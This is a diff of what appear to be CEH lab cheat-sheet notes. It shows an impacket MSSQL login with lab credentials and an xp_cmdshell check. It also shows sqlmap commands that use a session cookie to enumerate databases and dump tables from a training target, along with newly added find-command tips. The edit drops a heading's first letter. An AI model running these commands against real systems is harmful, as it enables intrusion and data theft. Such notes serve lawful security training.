@@ -6,13 +6,21 @@ python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30
 SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
 
 
-**Gaining Access - dumping the SQL Database using cookie SQL Map**
+aining Access - dumping the SQL Database using cookie SQL Map**
 >>>enumerate databases
 sqlmap -u "URL" --cookie="PHPSESSID=1234" --dbs
 >>>List tables in DB
 sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie="[cookie]" -D moviescope --tables
 >>>Dump full table
 sqlmap -u "TARGET_URL" --cookie="SESSION_COOKIE" -D DATABASE_NAME -T TABLE_NAME --dump
+
+**Find file by name but in the current folder**
+find . -name filename 2>/dev/null
+
+**Find file by name**
+find / -name "filename" 2>/dev/null
+
+
 
 
 **MOBILE-download all the apk packages - apart from 3rd party APKs**
